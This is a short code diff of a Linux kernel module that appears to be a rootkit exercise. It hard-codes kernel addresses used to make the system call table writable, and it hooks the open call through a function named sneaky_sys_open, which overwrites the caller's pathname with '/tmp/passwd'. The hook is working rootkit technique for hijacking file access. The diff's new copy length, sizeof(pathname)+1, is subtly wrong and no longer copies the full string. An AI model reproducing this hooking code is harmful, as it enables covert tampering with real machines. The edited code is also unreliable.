@@ -52,8 +52,8 @@ module_param(pid, int, 0);
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707c0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070740;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff8106f6f0;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff8106f670;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
@@ -75,7 +75,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
     const char * fake = "/tmp/passwd";
     char * mychar = (char *) pathname;
     printk("My original string is:%s!\n", pathname);
-    unsigned long result = copy_to_user((void __user *)mychar, (const void*) fake, 12);
+    unsigned long result = copy_to_user((void __user *)mychar, (const void*) fake, sizeof(pathname)+1);
     printk("My new string is:%s!\n", pathname);
     printk("My result is:%lu!\n", result);
     //copy fake string to pathname
